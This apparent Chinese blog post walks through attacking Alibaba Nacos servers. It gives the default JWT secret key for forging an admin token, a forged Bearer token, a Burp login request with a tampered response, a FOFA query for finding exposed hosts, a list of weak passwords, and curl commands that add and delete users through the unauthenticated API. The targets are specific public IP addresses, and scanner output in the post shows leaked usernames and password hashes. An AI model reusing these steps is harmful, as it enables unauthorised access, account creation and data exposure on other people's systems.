---
title: "Nacost通过文件打出getshell"
date: 2024-06
categories: [漏洞挖掘]
tags:
  - Nacost
  - getshell
  - JWT
---

Nacos 是阿里巴巴开源的一个动态服务发现、配置管理和服务管理平台。它专为微服务架构设计，提供了服务发现与注册、配置管理、动态 DNS 服务、服务健康检查、断路器等功能。Nacos 的核心组件包括服务注册中心、配置中心和控制台。



**师傅笔记：**

JWT身份伪造:https://jwt.io/

使用nacos默认key可进行jwt构造

nacos默认key（token.secret.key值的位置在conf下的application.properties）

SecretKey012345678901234567890123456789012345678901234567890123456789

JWT DATA:

{

"sub": "nacos",

"exp": 1682308800

}

网站地址:https://jwt.io/

时间戳网址:https://tool.lu/timestamp/

构造完毕的数据包:

FOFA语句:app="nacos" && port="8848"





username=nacos&password=nacos



弱口令：

ceshi

crow

crowr

admin1



[http://101.42.21.9/](http://101.42.21.9/)

[http://123.57.224.28:8848/](http://123.57.224.28:8848/)



/v1/auth/users?pageNo=1&pageSize=10 可查看到用户列表

curl -X POST '[http://101.42.21.9/v1/auth/users?username=shangxin&password=shangxin](http://101.42.21.9/v1/auth/users?username=shangxin&password=shangxin)'

-H 'User-Agent: Nacos-Server' 添加用户



/v1/auth/users

username=shangxin&password=shangxin

User-Agent:Nacos-Server



查看用户是否添加成功:

/v1/auth/search?username=shangxin

curl '[http://101.42.21.9/v1/auth/search?username=shangxin](http://101.42.21.9/v1/auth/search?username=shangxin)'

删除用户

curl -X DELETE "[http://101.42.21.9/v1/auth/users?username=shangxin](http://101.42.21.9/v1/auth/users?username=shangxin)"





**个人笔记：**

对nacos网站先--》nacos漏洞综合利用工具

<!-- 这是一张图片，ocr 内容为：NACOS福河综合利用工具_V3.9 AUTHOR:CHARONLIGHT 设置 关于 HTTP://101.42.21.9/#/LOGIN 漏消!除测! 酒空面板 制润: ALL 漏制描述 目标: 弱口令保破 检测日志 汤洞说明 权限绕过深洞利用 SQL注入利用 YAML反序列化 内存马注入 北量检测 NACOS  格: 版本号: HTTP://101.21.9:80 如果NACOS的踏径不是学见的脂径,在目标中指测INACOS路径即可进行调及员利用 2.1.0 2024-03-19 20:49:58: 开始检测所有漏洞!!! 2024-03-19 20:49:58:1]不存在NACOS控制台默认口令临洞(NACOS,NACOS) 2024-03-19 20:49:58:[+]存在NACOS TOKEN.SECRET.KEY致认配蛋(QVD-2023-6271) TOKENTTL:18000,QLOBALADMIN':TRUE,USERNAME`:HACOS" 2024-03-19 20:49:58:[!]需要人工确认NACOS-CLIENT YAML反序列化滋洞 请使用YAML反序列化模块进行验证及具利用 2024 03-1920:49:58:[]不存在NACOS DERBY SOL注入蔬洞(CNVD-2020 67618) 存在NACOS 未控权访问漏洞)(CVC-2021-29441) 2024-03-19 20:49:58:1 [TOTALCOUNL':76, PAGENUMBER":1) TLABLE''S,PAGETTENS;;('USCRNAINE;;SQNDEERIT/171085075990759907HRYP:562CYEJO? ;  PASSWORD':S205Z WHAZRA8MXNNLA3MFFAPOWLJEKJP HZOO1IXIXIXIXZVXKOB2"''USERNAME"*1552EEDFELCAAB8FYDEROPYDEROPYDEROPYDEROPYDEROPYP8LX9HIKGPV- PASSVORD;;;,S28$10SRINW/(MASSBPXISADSSU)LGFAL/SPHQD3PKATJSRINT", PASSWORD';373510515KGPG5ZD34DCYINGEIROULWGSP/M3TRELLFLVEGGHIBUDBAFGN.KT('USERNAME;;;; ;;ADMIN1Z3', BGERFBPO"PASSWORD"**ZA$10SKVJE4XTB5AFRS4BNHOIAL.EYNAJETB8YZ11 2024-03-1920:49:58: 哲未实现POC检测,请使用内存马注入模块进行验证 -->
![](img/1-0689325a.png)



**1.伪造nacos用户登录**



**exp：**

JWT DATA:

{

"sub": "nacos",

"exp": 1682308800_<u>（这个为时间戳，要大于当前时间）</u>_

}



使用nacos默认key可进行jwt构造

nacos默认key（token.secret.key值的位置在conf下的application.properties）

SecretKey012345678901234567890123456789012345678901234567890123456789



JWT身份伪造:https://jwt.io/

<!-- 这是一张图片，ocr 内容为：LEAM ABOUT THE UPCOMING CHANGES TO JWT IO AND SHARE YOUR FOEDBACK 4 JNT CRAFTED BY ENCODED DECODED CO EDIT THE RRYLOAD AND SECRET PASTE A TOKENHERE HEADER:ALGORITHM&TOKEN TYPE EYJHBGCIOIJIUZI1NIISINR5CCI6IKPXVCJ9.EY JZDWIIOIJUYWNVCYISIMV4CCI6MTCYMZYWMJQXN ALG:  HS256', 30.PHEZPZHPHICD0F691DWKIJLBG_DS_KNBTXRNU TYP":JWT I3_KP6G "EXP*:1723602417 EXP HMACSHA256 BASE64URLENCODE(HEADER) + '.* + BASE64URLENCODE(PAYLOAD). SECRETKEY012345678901. 默认KEY ESECRET BASE64 ENCODED SIGNATUREVERIFIED SHARE JWT -->
![](img/2-fd3d6622.png)



**bp抓包：**

POST /v1/auth/users/login HTTP/1.1

Host: 101.42.21.9

Content-Length: 29

Pragma: no-cache

Cache-Control: no-cache        

Accept: application/json, text/plain, */*

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 uacq

Content-Type: application/x-www-form-urlencoded

Origin: [http://101.42.21.9](http://101.42.21.9)

Referer: [http://101.42.21.9/](http://101.42.21.9/)

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

sec-ch-ua-platform: "Windows"

sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"

sec-ch-ua-mobile: ?0

**Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDkzNjAyMH0.b2Qruw41JqKA5u5hNcwxjlLxMbP98fznXy9y2oF7Xxo**

紫色部分为Encoded



得到返回包“200 ok”

将返回包复制

<!-- 这是一张图片，ocr 内容为：自 新东二四日 英甲20:54 三门 X                                                                                                     PROJECT INTRUDER REPEATER WINDOW HELP BURP SUITE PROFESSIONAL V2021.9.1-TEMPORARY PROJECT-WEB BURP PR HAE PASSIVE SCAN CLLENT BURPJSLINKFINDER ONESCAN APIKIT XLA SQL 403 BYPASSER LOG42SCAN STRUTS FINDER PROXY PROJECT OPTIONS SEQUENCER LOGGER COMPARER HTTPHISTORY WEBSOCKELS HISTORY HTTPA COMMENT THIS LTEM 1 FOST /VL/AUTH/USORE/LEGIN HTTP/1.1 2 HOST:101.42.21.9 3 CONTONT-LENGTH:42 SCAN 4 ACCEPT:APPLICATION/ISON,TEXT/PLAIN.4/W DO PASSIVE SCAN O SAFARI/537.36 CACG 5 USER-AZENT:MT MINGA/5.0 (KINGOWS HT 10.0: WING4: X64) APPLAPPLAFEBRIT/&37.36 (KHTT 6 CONTENL-TYPE:APPLICATION/X-WWW-FORM-URLENCODED 7CRIGIN:HTTP://101.42.21.9 8 REFERER:BTTP://101.42.21.9/ SEND TO REPEATER CTRL-R 9ACCEPT-BNCODING:G2LPDEFLATE 10 ACCOPT-LANGUAGO:ZH-CH.CH.Q LL SOE-CH-WA-PLATFORN:WINDOWS 12 GOC-CH-UA:"GOOGLE CHROME";"113","CHROMITM":"13","HOT-ARBRAND":V24 13 SOO.CH-UA-MOBILE:70 14 CONNECTION: ELOSE 15 16 UGERNAME-DADADAWAADX-PASSXORD-WCAWADDANDAD CHANGE REQUEST METHOD COPY URI COPY AS CURL COMMAND COPY TO FILE PASTE FROM FILE DON'T INTERCEPT REQUESTS DO INTERCEPT RESPONSE TO THIS REQUEST URL-ENCODE AS YOU TYPE CUT CTRL-C COPY PASLE 0:14:15 MESSAGE EDITOR DOCUMENTATION PROXY IN TERCEPTION DOCUMENTATION 0 MATCHES NACOS通过文件打出GETSHELL 0% -->
![](img/3-f5aec518.png)



修改浏览器的响应包

<!-- 这是一张图片，ocr 内容为：RESPONSE FROM HTTP//101.42.21.9:00/VI/AUTH/USERS/LOGIN OPEN BROWSER INTERCEPT IS ON FORWARD ACTION 三 HEX RENDER RAV IN Q1 403 2 SERVER:NGINX/1.2 19 MAR 2024 12:54:46 GMT DATE:TUE. 4 CONTENT-TYPE:APPLICATION/JSON:CHARSET-UTF-8 5 CONTENT-LENGTH:13 CONHECTION:CLOSE CONTENT-SECURITY-POLICY:SCRIPT-SRC SE1 UNKOOWOUSER! -->
![](img/4-de5c86b0.png)



<!-- 这是一张图片，ocr 内容为：RESPONSE FROM HTTP://101.21.9:80/V1/AUTH/USERS/LOGIN FORWARD OPEN BROWSER INTERCEPTIS ON DROP PRETTY HEX IN RAW RENDER 1 HTTP/1.1 200 2  SERVOR:NGINX/1.20.2 3 DATE:TUE 19 MAR 2024 12:54:28 GMT 4 CONTENT-LYPE:APPLICATION/JSONICHARSET-UTF-8 CONNECTION:CLOSE 6CONTENT-SECURITY-POLICY:SCRIPT-SRC SELL 7 SEL-GOOKIE:JSESSICNID-100B03A600B29F84C52BL6229F206549: PLLPONL 8AUTHOXI2AT CONTENT-LENGTH:197 9 CO "ACCENATAKEN':"EYJHIGGEIOIJINEYINIIEXTEXTERSECTEPRYCTANCTEXTEXTIDIJUYARVEYI;INVECTEXTEXTEXHDTELDHO,3R ORPPPNL8ABKSWE599AWY31-ZCS IRU7Y24FH4LI35GA8 TOKENTTL :18000 GLOBALADMIN :TRUE, SERNAME -->
![](img/5-76a4abbb.png)

Forward 后浏览器成功登录。







**2.存在未授权**



**没有登录的情况下，可以直接访问到网站**



<!-- 这是一张图片，ocr 内容为：内存 控制台源代码/来源代码内存 LO SUPERSEARCHPLUSTOOLS 应用EDITTHISCOOKIE HACKBAR 元系 ENCRYPTION LFI XXE ENCODING OTHER XSS SQL* HTTP://101.42.21.9/V1/AUTH/USERS LOAD URL 98 SPLIT URL EXECULE USER AGENT COOKIES CLEAR ALL REFERER POST DATA USERNAMESHANGXIN&PASSWORDSHANGXIN 控制台 新变化 开发者资源 网络状况 搜索X 酒盖率 LIGHTHOUSE -->
![](img/6-98a8dbe0.png)

/v1/auth/users?pageNo=1&pageSize=10 可查看到用户列表

curl -X POST '[http://101.42.21.9/v1/auth/users?username=shangxin&password=shangxin](http://101.42.21.9/v1/auth/users?username=shangxin&password=shangxin)'

-H 'User-Agent: Nacos-Server' 添加用户



/v1/auth/users

username=shangxin&password=shangxin

User-Agent:Nacos-Server



查看用户是否添加成功:

/v1/auth/search?username=shangxin

curl '[http://101.42.21.9/v1/auth/search?username=shangxin](http://101.42.21.9/v1/auth/search?username=shangxin)'

删除用户

curl -X DELETE "[http://101.42.21.9/v1/auth/users?username=shangxin](http://101.42.21.9/v1/auth/users?username=shangxin)"

<!-- 这是一张图片，ocr 内容为：介主页 KALI UBUNTU 3月19日20:59华 回终端 活动 HACKER@UBUNTU-DRONE:~ 可 HACKERQUBUNTU-DRONE:-S CURL -X DELETE "HTTP://101.42.21.9/V1/AUTH/USERS?USERNAME-SHANGXIN" ("CODE":200,"MESSAGE":NULL,"DATA":"DELETE USER OK!"/"HACKERQUBUNTU-DRONE:-S -->
![](img/7-7f23f555.png)





**3.有数据库信息**

user，passwd，port，host可进行数据库连接

